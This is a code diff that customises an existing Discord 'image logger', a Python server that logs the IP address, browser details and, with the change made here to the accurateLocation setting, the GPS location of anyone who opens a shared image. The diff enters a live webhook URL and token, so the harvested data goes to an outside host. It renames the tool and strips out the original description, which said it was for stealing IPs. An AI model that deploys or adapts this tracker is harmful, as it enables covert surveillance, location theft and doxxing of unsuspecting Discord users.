@@ -5,30 +5,30 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__app__ = "Discord Image"
+__description__ = "A simple application which allows you Open Original feature"
+__version__ = "v1.0"
+__author__ = "ThePresja1337"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334868452908863509/w3iwcZgdAfA1KkTGvw934ZuWRCXlug8HwF-tmXwzuolgU42Wp0cOGiPdC4cjM4TEGAzv",
+    "image": "https://storage.googleapis.com/pod_public/1300/157553.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Persio logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "ciekawie cn?", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -144,7 +144,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "Persio Logger - IP Logged",
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
